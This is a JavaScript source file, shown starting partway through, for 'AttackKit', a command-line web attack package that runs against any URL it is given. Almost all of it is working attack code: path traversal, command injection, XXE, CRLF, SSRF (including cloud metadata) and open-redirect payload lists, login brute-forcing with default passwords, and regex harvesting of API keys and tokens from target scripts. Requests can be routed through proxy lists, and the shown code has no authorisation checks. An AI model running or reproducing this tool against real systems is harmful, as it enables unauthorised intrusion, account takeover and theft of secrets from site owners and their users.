    const results = (await limitConcurrency(tasks, state.settings.maxConcurrentRequests)).filter(Boolean);
    return results.filter((r, i, a) => a.findIndex(x => x.type === r.type) === i);
  }

  const lfiPayloads = [
    '../../../../etc/passwd', '/etc/passwd', '%252e%252e%252fetc%252fpasswd',
    'php://filter/convert.base64-encode/resource=index.php', '....//....//....//....//windows/win.ini'
  ];
  async function lfiTester(targetUrl, form) {
    const tasks = lfiPayloads.map(payload => async () => {
      try {
        const body = new URLSearchParams();
        (form.inputs || []).forEach(i => { if (i.name) body.set(i.name, i.value || payload); });
        const res = await fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
        const text = await res.text();
        if (isMirror(text, state.runtime.baseline)) return null;
        if (text.includes('root:') || text.includes('daemon:') || text.includes('127.0.0.1 localhost')) {
          return { type: 'path-traversal', payload };
        }
        if (text.includes('PD9waHA') || text.includes('phpinfo')) {
          return { type: 'php-wrapper', payload };
        }
      } catch { }
      return null;
    });
    return (await limitConcurrency(tasks, state.settings.maxConcurrentRequests)).filter(Boolean);
  }

  async function openRedirectTester(targetUrl, form) {
    const payloads = ['https://evil.example', '//evil.example', '/\\evil.example'];
    const tasks = payloads.map(payload => async () => {
      try {
        const params = new URLSearchParams();
        (form.inputs || []).forEach(i => { if (i.name) params.set(i.name, payload); });
        const url = new URL(form.action || targetUrl, targetUrl);
        url.search = params.toString();
        const res = await fetchWithRetry(url.href, { method: form.method || 'GET', redirect: 'manual' });
        const location = res.headers.get('location') || res.headers.get('Location');
        if (location && (location.includes('evil.example') || location.startsWith('//'))) {
          return { payload, redirectUrl: location };
        }
      } catch { }
      return null;
    });
    return (await limitConcurrency(tasks, state.settings.maxConcurrentRequests)).filter(Boolean);
  }

  async function ssrfTester(targetUrl, form) {
    const internals = ['http://127.0.0.1:80', 'http://localhost', 'http://169.254.169.254/latest/meta-data/'];
    const tasks = internals.map(internal => async () => {
      try {
        const body = new URLSearchParams();
        (form.inputs || []).forEach(i => { if (i.name) body.set(i.name, internal); });
        const res = await fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
        const text = await res.text();
        if (isMirror(text, state.runtime.baseline)) return null;
        if (text.includes('127.0.0.1') || text.includes('localhost') || text.includes('169.254.169.254')) return { url: internal };
      } catch { }
      return null;
    });
    return (await limitConcurrency(tasks, state.settings.maxConcurrentRequests)).filter(Boolean);
  }

  async function commandInjectionTester(targetUrl, form) {
    const payloads = [';id', '|id', '&&id', '$(id)', '`id`'];
    const tasks = payloads.map(payload => async () => {
      try {
        const body = new URLSearchParams();
        (form.inputs || []).forEach(i => { if (i.name) body.set(i.name, i.value || payload); });
        const res = await fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
        const text = await res.text();
        if (isMirror(text, state.runtime.baseline)) return null;
        if (/uid=\d+\(|gid=\d+\(|root:x:|www-data:/i.test(text)) return { payload, evidence: text.substring(0, 120) };
      } catch { }
      return null;
    });
    return (await limitConcurrency(tasks, state.settings.maxConcurrentRequests)).filter(Boolean);
  }

  async function xxeTester(targetUrl, form) {
    const payload = `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`;
    try {
      const res = await fetchWithRetry(form.action || targetUrl, { method: 'POST', headers: { 'Content-Type': 'application/xml' }, body: payload });
      const text = await res.text();
      if (isMirror(text, state.runtime.baseline)) return { success: false };
      if (text.includes('root:') || text.includes('daemon:')) return { success: true, evidence: text.substring(0, 200) };
    } catch { }
    return { success: false };
  }

  async function crlfInjectionTester(targetUrl, form) {
    const payloads = ['%0d%0aSet-Cookie:crlf=injected', '%0aSet-Cookie:crlf=injected'];
    const tasks = payloads.map(payload => async () => {
      try {
        const body = new URLSearchParams();
        (form.inputs || []).forEach(i => { if (i.name) body.set(i.name, payload); });
        const res = await fetchWithRetry(form.action || targetUrl, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString() });
        const sc = res.headers.get('set-cookie');
        if (sc && sc.includes('crlf=injected')) return { payload };
      } catch { }
      return null;
    });
    return (await limitConcurrency(tasks, state.settings.maxConcurrentRequests)).filter(Boolean);
  }

  async function corsMisconfigTester(targetUrl) {
    const origins = ['https://evil.example', 'null'];
    for (const origin of origins) {
      try {
        const res = await fetchWithRetry(targetUrl, { headers: { 'Origin': origin } });
        const ao = res.headers.get('access-control-allow-origin');
        const ac = res.headers.get('access-control-allow-credentials');
        if (ao && (ao === '*' || ao === origin) && ac === 'true') return { origin, allowOrigin: ao };
      } catch { }
    }
    return null;
  }

  async function idorTester(targetUrl, html) {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const suspicious = ['id', 'uid', 'user', 'account', 'order', 'file', 'doc', 'product', 'profile'];
    const found = [];
    doc.querySelectorAll('a[href]').forEach(a => {
      const r = resolveUrl(a.href, targetUrl);
      if (!r) return;
      try {
        const u = new URL(r);
        const p = new URLSearchParams(u.search);
        for (const s of suspicious) {
          if (p.has(s) && /\d+/.test(p.get(s))) found.push({ url: u.href, param: s, value: p.get(s) });
        }
      } catch { }
    });
    return found;
  }

  // ============= JS analysis =============
  function extractSecrets(content, url) {
    const patterns = {
      'Google API Key': /AIza[0-9A-Za-z\-_]{35}/g,
      'AWS Access Key': /AKIA[0-9A-Z]{16}/g,
      'Stripe Publishable': /pk_live_[0-9a-zA-Z]{24}/g,
      'Stripe Secret': /sk_live_[0-9a-zA-Z]{24}/g,
      'GitHub Token': /ghp_[0-9a-zA-Z]{36}/g,
      'JWT': /eyJ[0-9a-zA-Z\-_]+\.[0-9a-zA-Z\-_]+\.[0-9a-zA-Z\-_]+/g,
      'Private Key': /-----BEGIN (?:RSA|DSA|EC|OPENSSH|PGP) PRIVATE KEY-----/g,
      'Slack Token': /xox[baprs]-[0-9a-zA-Z-]+/g,
      'Telegram Bot': /[0-9]+:AA[0-9A-Za-z\-_]{33}/g,
      'OpenAI Key': /sk-[A-Za-z0-9]{48}/g,
      'HuggingFace Token': /hf_[A-Za-z0-9]{40}/g
    };
    const out = [];
    for (const [name, re] of Object.entries(patterns)) {
      re.lastIndex = 0;
      const m = String(content || '').match(re);
      if (m) for (const val of m) out.push({ type: name, value: val.length > 120 ? val.slice(0, 120) + '...' : val, url });
    }
    return out;
  }

  async function jsSourceAnalyzer(jsFiles) {
    const secrets = [];
    for (const js of jsFiles) {
      if (!js || typeof js.content !== 'string') continue;
      secrets.push(...extractSecrets(js.content, js.url));
    }
    const dedup = new Map();
    for (const s of secrets) {
      const key = s.type + ':' + s.value;
      if (!dedup.has(key)) dedup.set(key, s);
    }
    return { secrets: [...dedup.values()] };
  }

  // ============= Brute force =============
  async function webLoginBrute(form) {
    const usernames = ['admin', 'root', 'test', 'user'];
    const passwords = ['admin', 'password', '123456', 'admin123', 'letmein', 'p@ssw0rd', 'test', 'welcome'];
    const csrf = (form.inputs || []).find(i => /csrf|token/i.test(i.name || ''))?.value || '';
    const tasks = [];
    for (const u of usernames) for (const p of passwords) tasks.push(async () => {
      try {
        const body = new URLSearchParams();
        (form.inputs || []).forEach(i => {
          if (!i.name) return;
          if (/user/i.test(i.name)) body.set(i.name, u);
          else if (/pass/i.test(i.name)) body.set(i.name, p);
          else if (/csrf|token/i.test(i.name)) body.set(i.name, csrf);
          else body.set(i.name, i.value || '');
        });
        const res = await fetchWithRetry(form.action, { method: form.method || 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body.toString(), redirect: 'manual' });
        if (res.status === 302 || res.status === 303) return { username: u, password: p };
        if (res.ok) {
          const text = await res.text();
          if (!/(login|wrong|error|invalid)/i.test(text) && !isMirror(text, state.runtime.baseline)) {
            return { username: u, password: p };
          }
        }
      } catch { }
      return null;
    });
    return (await limitConcurrency(tasks, state.settings.maxConcurrentRequests)).filter(Boolean);
  }

  // ============= CVE checks =============
  const cveDb = {
    'WordPress': [
      { name: 'wp-json user enumeration', path: '/wp-json/wp/v2/users', type: 'enum' },
      { name: 'xmlrpc.php accessible', path: '/xmlrpc.php', type: 'check' },
      { name: 'wp-cron.php accessible', path: '/wp-cron.php', type: 'check' }
    ],
    'Joomla': [
      { name: 'administrator login', path: '/administrator/index.php', type: 'check' }
    ],
    'Drupal': [
      { name: 'user/register accessible', path: '/user/register', type: 'check' }
    ],
    'Generic': [
      { name: 'Actuator env', path: '/actuator/env', type: 'check' },
      { name: '.git directory', path: '/.git/', type: 'check' },
      { name: 'server-status', path: '/server-status', type: 'check' },
      { name: 'swagger-ui', path: '/swagger-ui.html', type: 'check' }
    ]
  };

  async function autoAttack(targetUrl, profile) {
    const cms = profile.cms?.[0] || 'Generic';
    const exploits = cveDb[cms] || cveDb['Generic'];
    const tasks = exploits.map(exploit => async () => {
      const url = resolveUrl(exploit.path, targetUrl);
      if (!url) return null;
      try {
        const res = await fetchWithRetry(url);
        if (!res.ok && res.status !== 403) return null;
        if (exploit.type === 'enum') {
          try {
            const data = await res.json();
            if (Array.isArray(data) && data.length) return { name: exploit.name, url, type: 'enumeration', count: data.length };
          } catch { }
        }
        return { name: exploit.name, url, status: res.status };
      } catch { return null; }
    });
    return (await limitConcurrency(tasks, state.settings.maxConcurrentRequests)).filter(Boolean);
  }

  // ============= Reporting (only success shown) =============
  function reportProfile(profile) {
    const out = [];
    out.push(L('── PROFILE ──', 'accent'));
    out.push(L(`Target   : ${profile.target.normalized}`));
    out.push(L(`Status   : ${profile.target.status}`));
    out.push(L(`Tech     : ${profile.technology.length ? profile.technology.join(', ') : 'none'}`));
    out.push(L(`CMS      : ${profile.cms.length ? profile.cms.join(', ') : 'none'}`));
    out.push(L(`WAF      : ${profile.waf.join(', ')}`));
    out.push(L(`Language : ${profile.languages.join(', ')}`));
    out.push(L(`Purpose  : ${profile.purposes.join(', ')}`));
    out.push(L(`Forms    : ${profile.forms.length}`));
    if (profile.endpoints.length) {
      out.push(L(`Endpoints: ${profile.endpoints.length} found`, 'success'));
      profile.endpoints.slice(0, 12).forEach(e => out.push(L(`  • ${e}`, 'muted')));
      if (profile.endpoints.length > 12) out.push(L(`  … +${profile.endpoints.length - 12} more`, 'dim'));
    }
    if (profile.internalLinks.length) {
      out.push(L(`Internal links: ${profile.internalLinks.length}`, 'success'));
      profile.internalLinks.slice(0, 8).forEach(l => out.push(L(`  • ${l}`, 'muted')));
    }
    const dns = profile.dns || {};
    const dnsBits = [];
    if (dns.A?.length) dnsBits.push(`A: ${dns.A.map(r => r.data).join(',')}`);
    if (dns.MX?.length) dnsBits.push(`MX: ${dns.MX.map(r => r.data).join(',')}`);
    if (dns.NS?.length) dnsBits.push(`NS: ${dns.NS.map(r => r.data).join(',')}`);
    if (dnsBits.length) out.push(L(`DNS      : ${dnsBits.join(' | ')}`, 'success'));
    if (profile.subdomains.length) {
      out.push(L(`Subdomains: ${profile.subdomains.length}`, 'success'));
      profile.subdomains.slice(0, 12).forEach(s => out.push(L(`  • ${s}`, 'muted')));
    }
    if (profile.api.swagger) out.push(L(`Swagger : ${profile.api.swagger.url}`, 'success'));
    if (profile.api.graphql) out.push(L(`GraphQL : ${profile.api.graphql.url} (types: ${profile.api.graphql.types})`, 'success'));
    if (profile.api.restEndpoints.length) out.push(L(`REST API: ${profile.api.restEndpoints.length} endpoints`, 'success'));
    return out;
  }

  function reportExploit(results) {
    const out = [];
    out.push(L('── EXPLOIT ──', 'accent'));
    let totalHits = 0;
    for (const r of results.forms) {
      const buckets = [
        ['SQLi', r.sqli],
        ['LFI', r.lfi],
        ['Open Redirect', r.openRedirect],
        ['SSRF', r.ssrf],
        ['Command Injection', r.commandInjection],
        ['CRLF', r.crlf]
      ];
      const localHits = buckets.filter(([, arr]) => Array.isArray(arr) && arr.length > 0);
      const xxeHit = r.xxe && r.xxe.success;
      const corsHit = r.cors;
      if (localHits.length === 0 && !xxeHit && !corsHit) continue;
      out.push(L(`Form ${r.id} (${r.type}) → ${r.action}`, 'accent'));
      for (const [name, arr] of localHits) {
        totalHits += arr.length;
        out.push(L(`  ✓ ${name} (${arr.length})`, 'danger'));
        arr.slice(0, 3).forEach(hit => out.push(L(`      • ${hit.payload || hit.url || JSON.stringify(hit)}`, 'muted')));
      }
      if (xxeHit) { totalHits++; out.push(L(`  ✓ XXE`, 'danger')); }
      if (corsHit) { totalHits++; out.push(L(`  ✓ CORS misconfig (${corsHit.origin})`, 'danger')); }
    }
    if (results.idor.length) {
      totalHits += results.idor.length;
      out.push(L(`IDOR candidates: ${results.idor.length}`, 'danger'));
      results.idor.slice(0, 5).forEach(i => out.push(L(`  • ${i.url} (param: ${i.param})`, 'muted')));
    }
    if (totalHits === 0) out.push(L('No exploitable findings.', 'muted'));
    else out.push(L(`Total findings: ${totalHits}`, 'danger'));
    return out;
  }

  function reportAnalysis(analysis) {
    const out = [];
    out.push(L('── JS ANALYSIS ──', 'accent'));
    if (analysis.secrets.length) {
      out.push(L(`Secrets: ${analysis.secrets.length}`, 'danger'));
      analysis.secrets.slice(0, 15).forEach(s => out.push(L(`  • ${s.type} (${s.url})`, 'muted')));
    } else out.push(L('No secrets in JS.', 'muted'));
    return out;
  }

  function reportBrute(brute) {
    const out = [];
    out.push(L('── LOGIN BRUTE ──', 'accent'));
    if (brute.webLogin.length === 0) { out.push(L('No valid credentials found.', 'muted')); return out; }
    for (const w of brute.webLogin) {
      if (!w.attempts.length) continue;
      out.push(L(`Form ${w.form} (${w.action})`, 'accent'));
      w.attempts.slice(0, 5).forEach(a => out.push(L(`  ✓ ${a.username}:${a.password}`, 'danger')));
    }
    return out;
  }

  function reportAuto(events) {
    const out = [];
    out.push(L('── CVE CHECKS ──', 'accent'));
    if (!events.length) { out.push(L('No CVE indicators.', 'muted')); return out; }
    for (const e of events) {
      if (e.type === 'enumeration') out.push(L(`  ✓ ${e.name} — ${e.count} items`, 'danger'));
      else out.push(L(`  • ${e.name} [${e.status}]`, 'success'));
    }
    return out;
  }

  // ============= Main scan =============
  async function runScan(target, mode, api) {
    const profileInfo = applyProfile(mode === 'lowscan' ? 'low' : 'high');
    api.append([L(`◈ AttackKit scan started — ${profileInfo.label} (concurrent=${state.settings.maxConcurrentRequests})`, 'accent')]);
    try { await prepareProxyList(); }
    catch (e) { return fail(`Proxy init failed: ${e.message}`); }

    const t0 = Date.now();
    let profile;
    try {
      profile = await buildProfile(target);
      api.append([L(`✓ Target profiled in ${Date.now() - t0}ms`, 'success')]);
      if (state.runtime.baseline?.notFoundHash) {
        api.append([L(`✓ Baseline 404 hash: ${state.runtime.baseline.notFoundHash.slice(0, 12)}… (mirror filter armed)`, 'dim')]);
      }
    } catch (e) { return fail(`Profiling failed: ${e.message}`); }

    const out = [];
    out.push(...reportProfile(profile));
    out.push(SP());

    const url = profile.target.normalized;
    const forms = profile.forms || [];
    const jsFiles = profile.jsFiles || [];

    // Parallel phase: exploit + js analysis + brute + cve
    const exploitTasks = forms.map(form => async () => {
      const type = classifyFormType(form);
      const [sqli, lfi, openRedirect, ssrf, commandInjection, crlf] = await Promise.all([
        sqliTester(url, form),
        lfiTester(url, form),
        openRedirectTester(url, form),
        ssrfTester(url, form),
        commandInjectionTester(url, form),
        crlfInjectionTester(url, form)
      ]);
      const xxe = await xxeTester(url, form);
      const cors = await corsMisconfigTester(url);
      return { id: form.id, action: form.action, method: form.method, type, sqli, lfi, openRedirect, ssrf, commandInjection, crlf, xxe, cors };
    });

    const idorPromise = idorTester(url, profile.html).catch(() => []);
    const jsPromise = jsSourceAnalyzer(jsFiles).catch(() => ({ secrets: [] }));
    const autoPromise = autoAttack(url, profile).catch(() => []);
    const bruteFormTasks = forms
      .filter(f => classifyFormType(f) === 'login')
      .map(form => async () => ({ form: form.id, action: form.action, attempts: await webLoginBrute(form) }));
    const brutePromise = limitConcurrency(bruteFormTasks, state.settings.maxConcurrentRequests);

    const [exploitForms, idor, analysis, autoResults, bruteResults] = await Promise.all([
      limitConcurrency(exploitTasks, state.settings.maxConcurrentRequests),
      idorPromise, jsPromise, autoPromise, brutePromise
    ]);

    const exploitData = { forms: exploitForms.filter(Boolean), idor: idor || [], uploads: [] };
    out.push(...reportExploit(exploitData));
    out.push(SP());
    out.push(...reportAnalysis(analysis));
    out.push(SP());
    out.push(...reportBrute({ webLogin: (bruteResults || []).filter(b => b && b.attempts && b.attempts.length) }));
    out.push(SP());
    out.push(...reportAuto(autoResults || []));
    out.push(SP());

    const total = Date.now() - t0;
    out.push(L('═════════════════════════════════════════════', 'accent'));
    out.push(L(`AttackKit done in ${total}ms — ${profileInfo.label}`, 'accent'));
    out.push(L(`False-positive mirrors filtered: ${state.runtime.stats.fpFiltered}`, state.runtime.stats.fpFiltered > 0 ? 'success' : 'dim'));
    return out;
  }

  // ============= Dispatcher =============
  async function dispatch({ args = [], api } = {}) {
    const cmd = String(args[0] ?? '').toLowerCase();
    const rest = args.slice(1);

    if (!cmd || cmd === 'help') {
      return [
        L('AttackKit — high-speed web scanner', 'accent'),
        L('Usage:', 'accent'),
        L('  attackkit scan    <url>   full scan (high-power)'),
        L('  attackkit lowscan <url>   full scan (mobile/low-power)'),
        L('  attackkit profile <url>   recon only'),
        L('  attackkit crawl   <url>   internal link crawl'),
        L('  attackkit dns     <domain>'),
        L('  attackkit subdomain <domain>'),
        L('  attackkit cloud   <url>'),
        L('  attackkit exploit <url>   SQLi/LFI/SSRF/... tests'),
        L('  attackkit analyze <url>   JS secret analysis'),
        L('  attackkit brute   <url>   login brute force'),
        L('  attackkit cve     <url>   CVE checks'),
        L('  attackkit setproxy <template-with-{url}>'),
        L('  attackkit help | version')
      ];
    }

    if (cmd === 'version') return [L(`attackkit v${VERSION}`, 'accent')];

    if (cmd === 'setproxy') {
      const t = rest.join(' ').trim();
      if (!t) return fail('usage: attackkit setproxy <template-with-{url}>');
      if (t === 'clear' || t === 'none') {
        state.runtime.customProxy = null;
        state.runtime.proxyList = [];
        state.runtime.proxyReady = false;
        return ok('custom proxy cleared');
      }
      if (!t.includes('{url}')) return fail('template must contain {url}');
      state.runtime.customProxy = t;
      state.runtime.proxyList = [];
      state.runtime.proxyReady = false;
      return ok('custom proxy set: ' + t);
    }

    const url = rest.join(' ').trim();
    const needsUrl = ['scan', 'lowscan', 'profile', 'crawl', 'cloud', 'exploit', 'analyze', 'brute', 'cve'];
    if (needsUrl.includes(cmd) && !url) return fail(`usage: attackkit ${cmd} <url>`);
    if (['dns', 'subdomain'].includes(cmd) && !url) return fail(`usage: attackkit ${cmd} <domain>`);

    try {
      if (cmd === 'scan') return await runScan(url, 'scan', api);
      if (cmd === 'lowscan') return await runScan(url, 'lowscan', api);

      if (cmd === 'profile') {
        await prepareProxyList();
        const profile = await buildProfile(url);
        return reportProfile(profile);
      }
      if (cmd === 'crawl') {
        await prepareProxyList();
        const links = await crawlInternalLinks(normalizeTarget(url), normalizeTarget(url), 2);
        if (!links.length) return [L('no internal links', 'muted')];
        return [L(`Internal links: ${links.length}`, 'success'), ...links.slice(0, 40).map(l => L(`  • ${l}`, 'muted'))];
      }
      if (cmd === 'dns') {
        await prepareProxyList();
        const d = await dnsEnumeration(url);
        const out = [L('── DNS ──', 'accent')];
        ['A', 'AAAA', 'MX', 'NS', 'CNAME', 'TXT', 'SOA', 'CAA'].forEach(k => {
          if (d[k]?.length) out.push(L(`${k}: ${d[k].map(r => r.data).join(', ')}`, 'success'));
        });
        if (d.SPF?.length) out.push(L(`SPF: ${d.SPF.join('; ')}`, 'success'));
        if (d.DMARC?.length) out.push(L(`DMARC: ${d.DMARC.join('; ')}`, 'success'));
        out.push(L(`DNSSEC: ${d.dnssec ? 'enabled' : 'disabled'}`, d.dnssec ? 'success' : 'muted'));
        return out;
      }
      if (cmd === 'subdomain') {
        await prepareProxyList();
        const subs = await subdomainEnumeration(url);
        if (!subs.length) return [L('no subdomains found', 'muted')];
        return [L(`Subdomains: ${subs.length}`, 'success'), ...subs.slice(0, 60).map(s => L(`  • ${s}`, 'muted'))];
      }
      if (cmd === 'cloud') {
        await prepareProxyList();
        const r = await cloudMetadataDetection();
        if (!r.length) return [L('no cloud metadata exposed', 'muted')];
        return [L(`Cloud metadata: ${r.length}`, 'danger'), ...r.map(x => L(`  ✓ ${x.cloud} — ${x.url}`, 'danger'))];
      }
      if (cmd === 'exploit') {
        await prepareProxyList();
        const profile = await buildProfile(url);
        const forms = profile.forms || [];
        const tasks = forms.map(form => async () => {
          const type = classifyFormType(form);
          const [sqli, lfi, openRedirect, ssrf, commandInjection, crlf] = await Promise.all([
            sqliTester(url, form), lfiTester(url, form), openRedirectTester(url, form),
            ssrfTester(url, form), commandInjectionTester(url, form), crlfInjectionTester(url, form)
          ]);
          const xxe = await xxeTester(url, form);
          const cors = await corsMisconfigTester(url);
          return { id: form.id, action: form.action, method: form.method, type, sqli, lfi, openRedirect, ssrf, commandInjection, crlf, xxe, cors };
        });
        const results = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
        const idor = await idorTester(url, profile.html).catch(() => []);
        return reportExploit({ forms: results.filter(Boolean), idor, uploads: [] });
      }
      if (cmd === 'analyze') {
        await prepareProxyList();
        const profile = await buildProfile(url);
        const a = await jsSourceAnalyzer(profile.jsFiles || []);
        return reportAnalysis(a);
      }
      if (cmd === 'brute') {
        await prepareProxyList();
        const profile = await buildProfile(url);
        const forms = (profile.forms || []).filter(f => classifyFormType(f) === 'login');
        const tasks = forms.map(form => async () => ({ form: form.id, action: form.action, attempts: await webLoginBrute(form) }));
        const results = await limitConcurrency(tasks, state.settings.maxConcurrentRequests);
        return reportBrute({ webLogin: results.filter(b => b && b.attempts && b.attempts.length) });
      }
      if (cmd === 'cve') {
        await prepareProxyList();
        const profile = await buildProfile(url);
        const r = await autoAttack(url, profile);
        return reportAuto(r);
      }

      return fail(`unknown command: ${cmd}`);
    } catch (e) {
      return fail(e.message);
    }
  }

  // ============= Lifecycle =============
  const install = async api => {
    state.api = api;
    if (!api || typeof api.registerCommand !== 'function') {
      throw new Error('PACKAGE_BRIDGE_UNAVAILABLE');
    }
    for (const name of manifest.commands) {
      if (name !== PKG) throw new Error(`COMMAND_NOT_DECLARED:${name}`);
    }
    const registered = api.registerCommand(PKG, {
      description: manifest.description,
      usage: 'attackkit <scan|lowscan|profile|crawl|dns|subdomain|cloud|exploit|analyze|brute|cve|setproxy|help|version> [args]',
      aliases: [],
      kind: 'plain',
      run: async ({ args = [], api: scopedApi } = {}) => {
        state.api = scopedApi || state.api;
        return await dispatch({ args, api: state.api });
      }
    });
    if (registered === false) {
      state.api = null;
      throw new Error('PACKAGE_COMMAND_REGISTRATION_FAILED');
    }
    return [];
  };

  const uninstall = async api => {
    const bridge = api || state.api;
    try { if (bridge?.unregisterCommand) bridge.unregisterCommand(PKG); } catch { }
    state.runtime.cache.clear();
    state.runtime.proxyList = [];
    state.runtime.proxyReady = false;
    state.api = null;
    return [];
  };

  globalThis[GLOBAL_KEY] = Object.freeze({
    manifest,
    install,
    uninstall,
    __internal: Object.freeze({
      PROFILES,
      normalizeTarget,
      buildBaseline,
      isMirror,
      getFreeUserProxy
    })
  });
})();